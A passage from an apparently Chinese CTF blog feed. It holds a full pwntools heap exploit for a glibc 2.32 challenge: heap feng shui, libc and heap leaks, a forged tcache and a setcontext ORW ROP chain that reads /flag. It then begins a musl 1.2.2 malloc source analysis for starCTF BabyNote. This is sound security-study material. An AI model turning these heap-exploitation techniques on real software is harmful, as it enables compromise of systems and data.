class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.32.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size, content=<span class="literal">None</span></span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;(: Size:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Content:&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> content <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        r.send(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Content:&#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    r = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># r = process(&#x27;./main&#x27;)</span></span><br><span class="line">        create(<span class="number">0x2000</span>)</span><br><span class="line">        create(<span class="number">0x2000</span>)</span><br><span class="line">        create(<span class="number">0xd20</span>)</span><br><span class="line">        create(<span class="number">0x500</span>)  <span class="comment">#3</span></span><br><span class="line">        create(<span class="number">0x4f0</span>)  <span class="comment">#4</span></span><br><span class="line">        create(<span class="number">0x4f0</span>)</span><br><span class="line">        create(<span class="number">0x100</span>)</span><br><span class="line">        create(<span class="number">0x510</span>)</span><br><span class="line">        create(<span class="number">0x100</span>)</span><br><span class="line">        create(<span class="number">0x500</span>)</span><br><span class="line">        create(<span class="number">0x108</span>)  <span class="comment">#10</span></span><br><span class="line">        create(<span class="number">0x4f0</span>)</span><br><span class="line">        create(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">        delete(<span class="number">7</span>)</span><br><span class="line">        create(<span class="number">0x1000</span>)</span><br><span class="line">        delete(<span class="number">7</span>)</span><br><span class="line">        delete(<span class="number">5</span>)</span><br><span class="line">        create(<span class="number">0x1000</span>)</span><br><span class="line">        delete(<span class="number">5</span>)</span><br><span class="line">        delete(<span class="number">3</span>)</span><br><span class="line">        create(<span class="number">0x1000</span>)</span><br><span class="line">        delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">        create(<span class="number">0x500</span>, flat(<span class="number">0</span>, <span class="number">0x1c60</span> + <span class="number">1</span>))  <span class="comment">#3</span></span><br><span class="line">        create(<span class="number">0x4f0</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">8</span> + <span class="string">b&#x27;\x10\n&#x27;</span>)  <span class="comment">#5</span></span><br><span class="line">        delete(<span class="number">4</span>)</span><br><span class="line">        create(<span class="number">0x1000</span>)</span><br><span class="line">        delete(<span class="number">4</span>)</span><br><span class="line">        create(<span class="number">0x510</span>, <span class="string">b&#x27;\x10\n&#x27;</span>)  <span class="comment">#4</span></span><br><span class="line">        create(<span class="number">0x4f0</span>)  <span class="comment">#7---4</span></span><br><span class="line">        edit(<span class="number">10</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x100</span> + p64(<span class="number">0x1c60</span>))</span><br><span class="line">        delete(<span class="number">11</span>)</span><br><span class="line">        show(<span class="number">4</span>)</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        heap_base = u64(</span><br><span class="line">            r.recvuntil(<span class="string">b&#x27;1. Create&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x5a10</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line">        create(<span class="number">0x4f0</span>)  <span class="comment">#11</span></span><br><span class="line">        create(<span class="number">0x2000</span>)  <span class="comment">#13</span></span><br><span class="line">        delete(<span class="number">13</span>)</span><br><span class="line">        show(<span class="number">7</span>)</span><br><span class="line">        libc_base = u64(</span><br><span class="line">            r.recvuntil(<span class="string">b&#x27;1. Create&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1e4280</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">        tls_tcache = libc_base + <span class="number">0x1eb578</span></span><br><span class="line">        _IO_file_jumps_addr = libc_base + <span class="number">0x1e54c0</span></span><br><span class="line">        _IO_file_jumps_SYNC_addr = _IO_file_jumps_addr + <span class="number">0x60</span></span><br><span class="line"></span><br><span class="line">        fake_tcache = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x7C</span> - <span class="number">0x10</span>)</span><br><span class="line">        fake_tcache += p16(<span class="number">1</span>)</span><br><span class="line">        fake_tcache += p16(<span class="number">1</span>)</span><br><span class="line">        fake_tcache = fake_tcache.ljust(<span class="number">0x270</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">        fake_tcache += p64(_IO_file_jumps_SYNC_addr)</span><br><span class="line">        fake_tcache += p64(libc_base + <span class="number">0x1e48c0</span>)</span><br><span class="line"></span><br><span class="line">        payload = fake_tcache</span><br><span class="line">        create(<span class="number">0x4f0</span>, payload)  <span class="comment">#13</span></span><br><span class="line">        delete(<span class="number">4</span>)</span><br><span class="line">        create(<span class="number">0x2000</span>)</span><br><span class="line">        delete(<span class="number">4</span>)</span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x600</span> + flat(<span class="number">0</span>, <span class="number">0x521</span>, libc_base + <span class="number">0x1e4030</span>, libc_base</span><br><span class="line">                                      + <span class="number">0x1e4030</span>, <span class="number">0</span>, tls_tcache - <span class="number">0x20</span>)</span><br><span class="line">        create(<span class="number">0x600</span> + <span class="number">0x30</span>, payload)</span><br><span class="line">        delete(<span class="number">7</span>)</span><br><span class="line">        create(<span class="number">0x2000</span>)</span><br><span class="line">        delete(<span class="number">7</span>)</span><br><span class="line">        create(<span class="number">0x4f0</span>, fake_tcache)</span><br><span class="line"></span><br><span class="line">        pop_rdi = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi\nret&#x27;</span>)))</span><br><span class="line">        pop_rsi = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi\nret&#x27;</span>)))</span><br><span class="line">        pop_rdx = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdx\nret&#x27;</span>)))</span><br><span class="line">        pop_rax = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rax\nret&#x27;</span>)))</span><br><span class="line">        syscall = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;syscall\nret&#x27;</span>)))</span><br><span class="line">        ret = libc_base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;ret&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">        heap_addr = heap_base + <span class="number">0x7298</span></span><br><span class="line">        payload = <span class="string">b&#x27;/flag\x00\x00\x00&#x27;</span></span><br><span class="line">        payload += flat(pop_rdi, heap_addr - <span class="number">0x8</span>, pop_rsi, <span class="number">0</span>, pop_rdx, <span class="number">0</span>,</span><br><span class="line">                        pop_rax, <span class="number">2</span>, syscall)</span><br><span class="line">        payload += flat(pop_rdi, <span class="number">3</span>, pop_rsi, libc_base + libc.bss(), pop_rdx,</span><br><span class="line">                        <span class="number">0x100</span>, pop_rax, <span class="number">0</span>, syscall)</span><br><span class="line">        payload += flat(pop_rdi, <span class="number">1</span>, pop_rsi, libc_base + libc.bss(), pop_rdx,</span><br><span class="line">                        <span class="number">0x100</span>, pop_rax, <span class="number">1</span>, syscall)</span><br><span class="line">        create(<span class="number">0x1200</span>, payload)</span><br><span class="line"></span><br><span class="line">        create(<span class="number">0x590</span>, fake_tcache[<span class="number">48</span>:])</span><br><span class="line">        payload = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0xa0</span> + p64(heap_addr) + p64(ret)</span><br><span class="line">        create(<span class="number">0x400</span>, payload)</span><br><span class="line">        create(<span class="number">0x3f0</span>, p64(libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span> + libc_base))</span><br><span class="line"></span><br><span class="line">        delete(<span class="number">15</span>)</span><br><span class="line">        <span class="comment"># delete(9)</span></span><br><span class="line">        create(</span><br><span class="line">            <span class="number">0xb40</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0xb08</span> +</span><br><span class="line">            flat(<span class="number">0x521</span> | <span class="number">4</span>, libc_base + <span class="number">0x1e4030</span>, libc_base + <span class="number">0x1e4030</span>,</span><br><span class="line">                 heap_base + <span class="number">0x6020</span>, heap_base + <span class="number">0x6020</span>))</span><br><span class="line">        create(<span class="number">0x610</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x608</span> + p64(<span class="number">0x500</span> | <span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">        create(<span class="number">0x510</span>)</span><br><span class="line">        r.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">        r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        r.recvuntil(<span class="string">b&#x27;(: Size:&#x27;</span>)</span><br><span class="line">        r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0x2000</span>), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="comment"># gdb.attach(r)</span></span><br><span class="line">        <span class="comment"># pause()</span></span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        r.close()</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>在前面chunk布局的时候最好多放点chunk，不然就跟我一样后续加很麻烦。</p><hr><p>参考文章：</p><p><a class="link"   href="https://www.anquanke.com/post/id/235598" >https://www.anquanke.com/post/id/235598<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;看我前面的文章可以发现我在做漏洞利用的总结主要是在glibc2.31以下版本的，这也就导致了在后续版本的glibc的利用方式我也没怎么掌握，后续打算将house of kiwi以及house of Emma写完之后会关注一下glibc2.31之后的how2heap的poc，</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="HeapFengShui" scheme="https://cv196082.gitee.io/tags/HeapFengShui/"/>
    
    <category term="house系列" scheme="https://cv196082.gitee.io/tags/house%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>musl1.2.2源码分析+starCTF-BabyNote复现</title>
    <link href="https://cv196082.gitee.io/2022/05/10/musl1-2-2%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-starCTF-BabyNote%E5%A4%8D%E7%8E%B0/"/>
    <id>https://cv196082.gitee.io/2022/05/10/musl1-2-2%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-starCTF-BabyNote%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-05-10T08:30:48.000Z</published>
    <updated>2022-05-10T08:29:45.560Z</updated>
    
    <content type="html"><![CDATA[<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><p>这里根据我参考的文章来进行分析，chunk-&gt;group-&gt;mate</p><h4 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a><strong>chunk</strong></h4><p>这里其实是没有定义chunk这个结构的，不过根据效果可以推断出来</p><p>chunk关于0x10字节对其，如果是group中的第一个chunk，p的前0x10字节作为group结构体的头部，包括meta地址等。<br>如果不是第一个chunk，只有前4字节作为元数据，包括了idx和offset，用来计算与该chunk与group地址的偏移。如果该chunk被释放，idx会被写为0xff，offset为0。<br>idx和offset的作用就是free时根据chunk地址找到该group对应meta的地址，也为漏洞利用做了铺垫。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line"> <span class="keyword">char</span> prev_user_data[];</span><br><span class="line">    <span class="keyword">uint8_t</span> idx;  <span class="comment">//低5bit为idx第几个chunk</span></span><br><span class="line">    <span class="keyword">uint16_t</span> offset; <span class="comment">//与第一个chunk起始地址的偏移，实际地址偏移为offset * UNIT</span></span><br><span class="line">    <span class="keyword">char</span> data[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="group"><a href="#group" class="headerlink" title="group"></a><strong>group</strong></h4><p>在musl中一个meta管理的内存区域用group表示，一个meta对应一个group。<br>group中存放size相同的相邻chunk，通过idx和offset索引。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span><span class="comment">// meta的地址</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> active_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="keyword">char</span> pad[UNIT - <span class="keyword">sizeof</span>(struct meta *) - <span class="number">1</span>];<span class="comment">// 保证0x10字节对齐</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> storage[];<span class="meta"># chunk</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>通过chunk获取group地址</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct meta *<span class="title">get_meta</span><span class="params">(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    assert(!((<span class="keyword">uintptr_t</span>)p &amp; <span class="number">15</span>));</span><br><span class="line">    <span class="keyword">int</span> offset = *(<span class="keyword">const</span> <span class="keyword">uint16_t</span> *)(p - <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> index = get_slot_index(p);</span><br><span class="line">    <span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">        assert(!offset);</span><br><span class="line">        offset = *(<span class="keyword">uint32_t</span> *)(p - <span class="number">8</span>);</span><br><span class="line">        assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="keyword">const</span> <span class="keyword">void</span> *)(p - UNIT*offset - UNIT);</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终就是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_addr = chunk_addr - <span class="number">0x10</span> * offset - <span class="number">0x10</span></span><br></pre></td></tr></table></figure><h4 id="meta"><a href="#meta" class="headerlink" title="meta"></a><strong>meta</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span><span class="comment">//双向链表</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span><span class="comment">// 这里指向管理的group 地址</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int</span> avail_mask, freed_mask;</span><br><span class="line">    <span class="keyword">uintptr_t</span> last_idx:<span class="number">5</span>; <span class="comment">//group中chunk数</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> freeable:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">uintptr_t</span> sizeclass:<span class="number">6</span>; <span class="comment">//管理group大小</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="keyword">uintptr_t</span>)<span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中如果这个meta 前后都没有，那么它的prev next 就指向它自己</p><p>avail_mask和freed_mask以bitmap方式表示group中chunk的状态</p><h4 id="meta-arena"><a href="#meta-arena" class="headerlink" title="meta_arena"></a><strong>meta_arena</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> check;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nslots;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在内存页起始地址，是多个meta的集合，这样是为了meta &amp; 0xffffffffffff000就能找到meta_arena结构体。</p><p>结构体中比较重要的就是check，Musl为了保证meta不被伪造，会验证meta_arena中的check是否与malloc_context中的secret相等。</p><h4 id="malloc-context"><a href="#malloc-context" class="headerlink" title="malloc_context"></a><strong>malloc_context</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> secret;<span class="comment">//也就是用于和meta_area验证的值</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PAGESIZE</span></span><br><span class="line">    <span class="keyword">size_t</span> pagesize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> init_done;</span><br><span class="line">    <span class="keyword">unsigned</span> mmap_counter;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span><span class="comment">//释放的meta</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span><span class="comment">//可用分配的meta</span></span><br><span class="line">    <span class="keyword">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *avail_meta_areas;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span><span class="comment">//可以分配的meta地址，idx与size相关</span></span><br><span class="line">    <span class="keyword">size_t</span> usage_by_class[<span class="number">48</span>];<span class="comment">//所有meta的group管理chunk数量</span></span><br><span class="line">    <span class="keyword">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> seq;</span><br><span class="line">    <span class="keyword">uintptr_t</span> brk;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="malloc和free的源码分析"><a href="#malloc和free的源码分析" class="headerlink" title="malloc和free的源码分析"></a>malloc和free的源码分析</h3><h4 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a><strong>malloc</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(<span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (size_overflows(n)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span>;</span></span><br><span class="line"><span class="keyword">uint32_t</span> mask, first;</span><br><span class="line"><span class="keyword">int</span> sc;</span><br><span class="line"><span class="keyword">int</span> idx;</span><br><span class="line"><span class="keyword">int</span> ctr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (n &gt;= MMAP_THRESHOLD) &#123;</span><br><span class="line"><span class="keyword">size_t</span> needed = n + IB + UNIT;</span><br><span class="line"><span class="keyword">void</span> *p = mmap(<span class="number">0</span>, needed, PROT_READ|PROT_WRITE,</span><br><span class="line">MAP_PRIVATE|MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (p==MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">wrlock();</span><br><span class="line">step_seq();</span><br><span class="line">g = alloc_meta();</span><br><span class="line"><span class="keyword">if</span> (!g) &#123;</span><br><span class="line">unlock();</span><br><span 